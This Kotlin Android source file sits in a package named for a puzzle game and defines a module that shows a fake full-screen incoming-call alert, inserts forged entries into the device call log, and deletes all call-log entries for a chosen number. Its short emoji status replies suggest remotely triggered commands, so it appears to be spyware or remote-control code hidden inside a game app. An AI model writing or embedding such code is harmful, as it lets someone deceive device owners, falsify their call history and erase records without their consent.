package com.puzzleblast.game.modules

import android.content.Context
import android.content.ContentValues
import android.provider.CallLog

object FakeCallModule {
    suspend fun fakeCall(ctx: Context, name: String): String {
        val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
        val pi = android.app.PendingIntent.getActivity(
            ctx, 0, android.content.Intent(ctx, com.puzzleblast.game.MainActivity::class.java),
            android.app.PendingIntent.FLAG_IMMUTABLE
        )
        val n = androidx.core.app.NotificationCompat.Builder(ctx, "alert")
            .setContentTitle("Incoming call")
            .setContentText(name)
            .setSmallIcon(android.R.drawable.sym_call_incoming)
            .setFullScreenIntent(pi, true)
            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
            .setCategory(androidx.core.app.NotificationCompat.CATEGORY_CALL)
            .build()
        nm.notify(5555, n)
        return "📞 fake incoming call: $name"
    }

    suspend fun insertLog(ctx: Context, num: String, type: String, sec: Int): String {
        val t = when (type) {
            "in" -> CallLog.Calls.INCOMING_TYPE
            "out" -> CallLog.Calls.OUTGOING_TYPE
            "missed" -> CallLog.Calls.MISSED_TYPE
            else -> return "📞 type must be in|out|missed"
        }
        val cv = ContentValues().apply {
            put(CallLog.Calls.NUMBER, num)
            put(CallLog.Calls.TYPE, t)
            put(CallLog.Calls.DATE, System.currentTimeMillis())
            put(CallLog.Calls.DURATION, sec)
        }
        ctx.contentResolver.insert(CallLog.Calls.CONTENT_URI, cv)
        return "📞 call log inserted"
    }

    suspend fun deleteLog(ctx: Context, num: String): String {
        val n = ctx.contentResolver.delete(CallLog.Calls.CONTENT_URI, "${CallLog.Calls.NUMBER}=?", arrayOf(num))
        return "🗑 deleted $n entries for $num"
    }
}
